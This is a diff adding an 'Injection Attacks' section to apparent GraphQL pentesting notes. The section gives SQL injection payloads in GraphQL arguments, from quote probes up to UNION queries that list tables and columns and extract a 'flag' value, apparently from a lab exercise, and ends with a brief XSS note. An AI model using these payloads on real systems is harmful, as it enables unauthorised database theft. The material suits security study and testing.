@@ -2,7 +2,7 @@
 
 **[GraphQL Learn](https://graphql.org/learn/)**
 
-## Basic Example
+## Basic Examples
 
 **GraphQL Request**
 ```json
@@ -172,3 +172,48 @@ Adjust query to test if previously determined data fields are accessible
 }
 ```
 
+## Injection Attacks
+
+### SQL Injection
+
+- Use introspection to identify what queries requiring arguments the backend supports
+- Sending queries without arguments to see if error message is returned
+- Try basic SQLi in the argument:
+```json
+{
+  user(username: "test' -- -") {
+    username
+    password
+  }
+}
+```
+- or:
+```json
+{
+  user(username: "test'") {
+    username
+    password
+  }
+}
+```
+- use results of introspection query to craft UNION-based SQLi:
+![introspection query results](../images/introspection_results.png)
+```json
+{
+  user(username: "x' UNION SELECT 1,2,GROUP_CONCAT(table_name),4,5,6 FROM information_schema.tables WHERE table_schema=database()-- -") {
+    username
+  }
+}
+```
+```json
+{"query":"{  user(username: \"student' UNION SELECT 1,2,GROUP_CONCAT(column_name),4,5,6 FROM information_schema.columns WHERE table_name='flag'-- -\") {    username  }}"}
+```
+```json
+{"query":"{  user(username: \"student' UNION SELECT 1,2,flag,4,5,6 FROM flag-- -\") {    username  }}"}
+```
+
+### Cross-Site Scripting (XSS)
+
+XSS vulnerabilities can occur if:
+- GraphQL responses are inserted into the HTML page without proper sanitization
+- if invalid arguments are reflected in error messages
